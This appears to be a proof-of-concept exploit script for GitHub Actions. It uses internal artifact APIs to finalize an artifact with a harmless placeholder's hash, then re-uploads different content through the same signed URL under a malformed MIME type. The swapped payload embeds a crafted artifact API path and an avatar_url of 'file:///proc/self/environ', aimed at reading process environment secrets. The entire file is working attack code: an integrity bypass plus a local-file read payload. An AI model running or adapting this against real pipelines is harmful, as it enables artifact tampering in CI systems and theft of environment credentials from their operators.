import {createHash} from 'node:crypto';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';
const ids=getBackendIdsFromToken(); const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY; const odd='application/json\u0085';
const ph=Buffer.from('{"probe":"query"}'); const phHash='sha256:'+createHash('sha256').update(ph).digest('hex');
async function up(url,bytes,mime){await new BlobClient(url).getBlockBlobClient().uploadData(bytes,{blobHTTPHeaders:{blobContentType:mime}});}
const name=`query-${process.env.GITHUB_RUN_ID}`;
const c=await client.CreateArtifact({workflowRunBackendId:ids.workflowRunBackendId,workflowJobRunBackendId:ids.workflowJobRunBackendId,name,version:7,mimeType:StringValue.create({value:'application/json'})});
if(!c.ok)throw new Error('create');
await up(c.signedUploadUrl,ph,'application/json');
const f=await client.FinalizeArtifact({workflowRunBackendId:ids.workflowRunBackendId,workflowJobRunBackendId:ids.workflowJobRunBackendId,name,size:String(ph.length),hash:StringValue.create({value:phHash})});
const id=String(f.artifactId);
const P=`${repo}/actions/artifacts/${id}/zip?api-version=2012-02-12`;
const body=Buffer.from(JSON.stringify({full_name:P,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'Repo Cassette query carrier',stargazers_count:0}));
await up(c.signedUploadUrl,body,odd);
console.log('QUERY',JSON.stringify({id,P,bytes:body.length,blobMime:odd}));
